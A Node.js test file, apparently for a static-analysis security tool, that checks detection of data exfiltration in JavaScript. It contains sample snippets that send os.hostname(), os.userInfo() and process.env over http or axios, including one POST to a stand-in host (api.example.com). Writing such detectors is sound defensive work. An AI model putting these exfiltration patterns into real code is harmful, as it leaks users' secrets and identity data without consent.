// Import Node.js Dependencies
import { readFileSync, promises as fs } from "node:fs";
import { describe, test } from "node:test";
import assert from "node:assert";

// Import Internal Dependencies
import { AstAnalyser } from "../../src/index.js";

const FIXTURE_URL = new URL("fixtures/dataExfiltration/", import.meta.url);

describe("dataExfiltration", () => {
  test("should be able to detect data exfiltration performed with member expressions", async() => {
    const values: Record<string, string> = {
      "process.env.js": "[process.env]",
      "process.env-re-assigned.js": "[process.env]",
      "hostname.js": "[os.hostname()]",
      "hostname-as-var.js": "[os.hostname()]",
      "homedir.js": "[os.homedir()]",
      "homedir-as-var.js": "[os.homedir()]",
      "user-info.js": "[os.userInfo()]",
      "user-info-as-var.js": "[os.userInfo()]",
      "user-info-property.js": "[os.userInfo()]",
      "multiple-data-sent-as-var.js": "[process.env,os.hostname(),os.homedir(),os.userInfo()]",
      "multiple-data-sent-as-obj.js": "[os.hostname(),os.userInfo(),os.homedir(),process.env]",
      "multiple-data-sent-as-array.js": "[process.env,os.homedir()]",
      "spreaded-array.js": "[process.env]",
      "spreaded-obj.js": "[process.env]",
      "http.js": "[os.hostname()]",
      "http-re-assigned.js": "[os.hostname()]",
      "duplicated.js": "[process.env]"
    };
    const fixturesDir = new URL("memberExpression/", FIXTURE_URL);
    const fixtureFiles = await fs.readdir(fixturesDir);

    for (const fixtureFile of fixtureFiles) {
      const fixture = readFileSync(new URL(fixtureFile, fixturesDir), "utf-8");
      const { warnings: outputWarnings } = new AstAnalyser(
      ).analyse(fixture);

      const [firstWarning] = outputWarnings;
      assert.strictEqual(outputWarnings.length, 1);
      assert.deepEqual(firstWarning.kind, "data-exfiltration");
      assert.strictEqual(firstWarning.value, values[fixtureFile]);
    }
  });

  test("should be able to detect data exfiltration performed with direct call expressions", async() => {
    const values: Record<string, string> = {
      "axios.js": "[process.env,os.hostname(),os.homedir(),os.userInfo()]",
      "http.js": "[os.hostname()]"
    };
    const fixturesDir = new URL("directCallExpression/", FIXTURE_URL);
    const fixtureFiles = await fs.readdir(fixturesDir);

    for (const fixtureFile of fixtureFiles) {
      const fixture = readFileSync(new URL(fixtureFile, fixturesDir), "utf-8");
      const { warnings: outputWarnings } = new AstAnalyser(
      ).analyse(fixture);

      const [firstWarning] = outputWarnings;
      assert.strictEqual(outputWarnings.length, 1);
      assert.deepEqual(firstWarning.kind, "data-exfiltration");
      assert.strictEqual(firstWarning.value, values[fixtureFile]);
    }
  });

  test("should be able to detect multiple data extraction with http", () => {
    const code = `
  import http from "http";
  import os from "os";

  const postData = os.userInfo().name;

const options = {
  hostname: 'api.example.com',
  port: 80,
  path: '/users',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const request = http.request; 

const req = request(options, (res) => {
    console.log(res);
});

const req2 = request(options, (res) => {
  console.log(res);
});

const request2 = http.request;

req.on('error', (e) => {
    console.error(e);
});

req2.write(os.hostname());

req.write(postData);


req.end();
       `;

    const { warnings: outputWarnings } = new AstAnalyser(
    ).analyse(code);

    assert.strictEqual(outputWarnings.length, 2);
    const [firstWarning, secondWarning] = outputWarnings;

    assert.deepEqual(firstWarning.kind, "data-exfiltration");
    assert.strictEqual(firstWarning.value, "[os.hostname()]");
    assert.deepEqual(secondWarning.kind, "data-exfiltration");
    assert.strictEqual(secondWarning.value, "[os.userInfo()]");
  });

  test("should not detect data exfiltration with a not imported from axios", () => {
    const code = `
        const axios = {
         post(){}
        };

       axios.post("/send", process.env);
       `;

    const { warnings: outputWarnings } = new AstAnalyser(
    ).analyse(code);

    assert.strictEqual(outputWarnings.length, 0);
  });

  test("should not detect data exfiltration with no sensitive data sent with axios", () => {
    const code = `
        import axios from "axios";

        const env = {};

       await axios.post("/send", env);
       `;

    const { warnings: outputWarnings } = new AstAnalyser(
    ).analyse(code);

    assert.strictEqual(outputWarnings.length, 0);
  });

  const fakeOs = `const os = {
          hostname(){
          return "localhost"
          },
          homedir(){
          return "/home/user"
          },
          userInfo(){
          return {};
          }
        };
  `;

  test("should not detect data exfiltration with os not imported from Node.js core", () => {
    const code = `
        import axios from "axios";

       ${fakeOs} 

       axios.post("/send", os.hostname());
       axios.post("/send", os.homedir());
       axios.post("/send", os.userInfo());
       `;

    const { warnings: outputWarnings } = new AstAnalyser(
    ).analyse(code);

    assert.strictEqual(outputWarnings.length, 0);
  });

  test("should not detect data exfiltration with not imported from Node.js core for return values", () => {
    const code = `
      import axios from "axios";

      ${fakeOs} 

      const hostname = os.hostname();
      const homedir = os.homedir();
      const userInfo = os.userInfo();

       await axios.post("/send", hostname);
       await axios.post("/send", homedir);
       await axios.post("/send", userInfo);
       `;

    const { warnings: outputWarnings } = new AstAnalyser(
    ).analyse(code);

    assert.strictEqual(outputWarnings.length, 0);
  });

  test("should not detect data exfiltration when os is imported but not passed as an argument", () => {
    const code = `
        import axios from "axios";
        import os from "os";

       await axios.post("/send", getData());
       `;

    const { warnings: outputWarnings } = new AstAnalyser(
    ).analyse(code);

    assert.strictEqual(outputWarnings.length, 0);
  });

  test("should not detect data exfiltration when http is not imported", () => {
    const code = `
      const req = {
        write(payload){
          console.log(payload);
        }
      }

      req.write(process.env);
       `;

    const { warnings: outputWarnings } = new AstAnalyser(
    ).analyse(code);

    assert.strictEqual(outputWarnings.length, 0);
  });

  test("should not detect data exfiltration when req.write does not come from http.request", () => {
    const code1 = `
  import http from "http";
      const req = {
        write(payload){
          console.log(payload);
        }
      }

      req.write(process.env);
       `;

    const code2 = `
  import http from "http";
  const request = http.request;
      const req = {
        write(payload){
          console.log(payload);
        }
      }

      req.write(process.env);
       `;
    const code3 = `
  import http from "http";
  const request = http.request;
      const req = {
        write(payload){
          console.log(payload);
        }
      }
      const req2 = request(options, (res) => {console.log(res)});

      req.write(process.env);
       `;
    const snipets = [code1, code2, code3];

    for (const snipet of snipets) {
      const { warnings: outputWarnings } = new AstAnalyser(
      ).analyse(snipet);

      assert.strictEqual(outputWarnings.length, 0);
    }
  });

  test("should not detect data exfiltration when passing traced function as argument instead of its return value", () => {
    const code = `
    import os from "os";
    import axios from "axios";

    const hostname = os.hostname;
    const homedir = os.homedir;
    const userInfo = os.userInfo;

    await axios.post("/extract", hostname);
    await axios.post("/extract", homedir);
    await axios.post("/extract", userInfo);
    `;

    const { warnings: outputWarnings } = new AstAnalyser(
    ).analyse(code);

    assert.strictEqual(outputWarnings.length, 0);
  });
});
